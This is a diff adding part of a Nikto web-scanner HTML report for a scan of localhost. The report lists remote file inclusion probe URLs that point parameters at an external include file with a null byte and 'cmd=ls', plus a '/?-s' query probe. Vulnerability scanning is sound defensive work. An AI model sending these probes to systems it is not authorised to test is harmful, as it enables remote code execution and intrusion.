+    <td>/?_CONFIG[files][functions_page]=http://cirt.net/rfiinc.txt?: Directory indexing found.</td>
+  </tr>
+  <tr>
+    <td class="column-head" valign="top"><b>Test Links</b></td>
+    <td>
+      <a href="http://localhost:80/?_CONFIG[files][functions_page]=http://cirt.net/rfiinc.txt?">http://localhost:80/?_CONFIG[files][functions_page]=http://cirt.net/rfiinc.txt?</a><br>
+      <a href="http://127.0.0.1:80/?_CONFIG[files][functions_page]=http://cirt.net/rfiinc.txt?">http://127.0.0.1:80/?_CONFIG[files][functions_page]=http://cirt.net/rfiinc.txt?</a>
+    </td>
+  </tr>
+  <tr>
+    <td class="column-head" valign="top"><b>OSVDB Entries</b></td>
+    <td>
+       <a href="http://osvdb.org/3268" title="More vuln information on OSVDB.org">OSVDB-3268</a>
+    </td>
+</table>
+
+<table  class="dataTable" width="95%">
+  <tr>
+    <td class="column-head" valign="top"><b>URI</b></td>
+    <td>/?npage=-1&content_dir=http://cirt.net/rfiinc.txt?%00&cmd=ls</td>
+  </tr>
+  <tr>
+    <td class="column-head" valign="top"><b>HTTP Method</b></td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head" valign="top"><b>Description</b></td>
+    <td>/?npage=-1&content_dir=http://cirt.net/rfiinc.txt?%00&cmd=ls: Directory indexing found.</td>
+  </tr>
+  <tr>
+    <td class="column-head" valign="top"><b>Test Links</b></td>
+    <td>
+      <a href="http://localhost:80/?npage=-1&content_dir=http://cirt.net/rfiinc.txt?%00&cmd=ls">http://localhost:80/?npage=-1&content_dir=http://cirt.net/rfiinc.txt?%00&cmd=ls</a><br>
+      <a href="http://127.0.0.1:80/?npage=-1&content_dir=http://cirt.net/rfiinc.txt?%00&cmd=ls">http://127.0.0.1:80/?npage=-1&content_dir=http://cirt.net/rfiinc.txt?%00&cmd=ls</a>
+    </td>
+  </tr>
+  <tr>
+    <td class="column-head" valign="top"><b>OSVDB Entries</b></td>
+    <td>
+       <a href="http://osvdb.org/3268" title="More vuln information on OSVDB.org">OSVDB-3268</a>
+    </td>
+</table>
+
+<table  class="dataTable" width="95%">
+  <tr>
+    <td class="column-head" valign="top"><b>URI</b></td>
+    <td>/?npage=1&content_dir=http://cirt.net/rfiinc.txt?%00&cmd=ls</td>
+  </tr>
+  <tr>
+    <td class="column-head" valign="top"><b>HTTP Method</b></td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head" valign="top"><b>Description</b></td>
+    <td>/?npage=1&content_dir=http://cirt.net/rfiinc.txt?%00&cmd=ls: Directory indexing found.</td>
+  </tr>
+  <tr>
+    <td class="column-head" valign="top"><b>Test Links</b></td>
+    <td>
+      <a href="http://localhost:80/?npage=1&content_dir=http://cirt.net/rfiinc.txt?%00&cmd=ls">http://localhost:80/?npage=1&content_dir=http://cirt.net/rfiinc.txt?%00&cmd=ls</a><br>
+      <a href="http://127.0.0.1:80/?npage=1&content_dir=http://cirt.net/rfiinc.txt?%00&cmd=ls">http://127.0.0.1:80/?npage=1&content_dir=http://cirt.net/rfiinc.txt?%00&cmd=ls</a>
+    </td>
+  </tr>
+  <tr>
+    <td class="column-head" valign="top"><b>OSVDB Entries</b></td>
+    <td>
+       <a href="http://osvdb.org/3268" title="More vuln information on OSVDB.org">OSVDB-3268</a>
+    </td>
+</table>
+
+<table  class="dataTable" width="95%">
+  <tr>
+    <td class="column-head" valign="top"><b>URI</b></td>
+    <td>/?show=http://cirt.net/rfiinc.txt??</td>
+  </tr>
+  <tr>
+    <td class="column-head" valign="top"><b>HTTP Method</b></td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head" valign="top"><b>Description</b></td>
+    <td>/?show=http://cirt.net/rfiinc.txt??: Directory indexing found.</td>
+  </tr>
+  <tr>
+    <td class="column-head" valign="top"><b>Test Links</b></td>
+    <td>
+      <a href="http://localhost:80/?show=http://cirt.net/rfiinc.txt??">http://localhost:80/?show=http://cirt.net/rfiinc.txt??</a><br>
+      <a href="http://127.0.0.1:80/?show=http://cirt.net/rfiinc.txt??">http://127.0.0.1:80/?show=http://cirt.net/rfiinc.txt??</a>
+    </td>
+  </tr>
+  <tr>
+    <td class="column-head" valign="top"><b>OSVDB Entries</b></td>
+    <td>
+       <a href="http://osvdb.org/3268" title="More vuln information on OSVDB.org">OSVDB-3268</a>
+    </td>
+</table>
+
+<table  class="dataTable" width="95%">
+  <tr>
+    <td class="column-head" valign="top"><b>URI</b></td>
+    <td>/?-s</td>
+  </tr>
+  <tr>
+    <td class="column-head" valign="top"><b>HTTP Method</b></td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head" valign="top"><b>Description</b></td>
+    <td>/?-s: Directory indexing found.</td>
+  </tr>
+  <tr>
+    <td class="column-head" valign="top"><b>Test Links</b></td>
+    <td>
+      <a href="http://localhost:80/?-s">http://localhost:80/?-s</a><br>
+      <a href="http://127.0.0.1:80/?-s">http://127.0.0.1:80/?-s</a>
+    </td>
+  </tr>
+  <tr>
+    <td class="column-head" valign="top"><b>OSVDB Entries</b></td>
+    <td>
+       <a href="http://osvdb.org/3268" title="More vuln information on OSVDB.org">OSVDB-3268</a>
+    </td>
+</table>
+
+<div>
+<p></p>
+<table class="headerTable" width="300"><tr><td>Host Summary</td></tr></table>
+<table  class="dataTable" width="95%">
+ <tr>
+   <td class="column-head"><b>Start Time</b></td>
+   <td>2026-03-14 20:55:51</td>
+ </tr>
+  <tr>
+   <td class="column-head"><b>End Time</b></td>
+   <td>2026-03-14 20:56:01</td>
+ </tr>
+  <tr>
+   <td class="column-head"><b>Elapsed Time</b></td>
+   <td>10 seconds</td>
+ </tr>
+ <tr>
+   <td class="column-head"><b>Statistics</b></td>
+   <td>6544 items checked, 0 errors, 34 findings</td>
+ </tr>
+</table>
+</div>
+<p></p>
+
+<p></p>
+<table class="headerTable" width="300"><tr><td>Scan Summary</td></tr></table>
+<table class="dataTable" width="95%">
+  <tr>
+    <td class="column-head" valign="top"><b>Software Details</b></td>
+    <td><a href="http://cirt.net/">Nikto 2.1.5</a></td>
+  <tr>
+    <td><b>CLI Options</b></td>
+    <td>-h http://127.0.0.1 -o nikto_report.html -Format html</td>
+  </tr>
+  <tr>
+    <td><b>Hosts Tested</b></td>
+    <td>1</td>
+  </tr>
+  <tr>
+    <td><b>Start Time</b></td>
+    <td>Sat Mar 14 20:55:51 2026</td>
+  </tr>
+  <tr>
+    <td><b>End Time</b></td>
+    <td>Sat Mar 14 20:56:01 2026</td>
+  </tr>
+  <tr>
+    <td><b>Elapsed Time</b></td>
+    <td>10 seconds</td>
+  </tr>
+</table>
+<p></p>
+<p class="copyright">&copy; 2008 CIRT, Inc.</p>
+
+<!-- (c) 2008 CIRT, Inc. -->
+
+</body>
+</html>
+
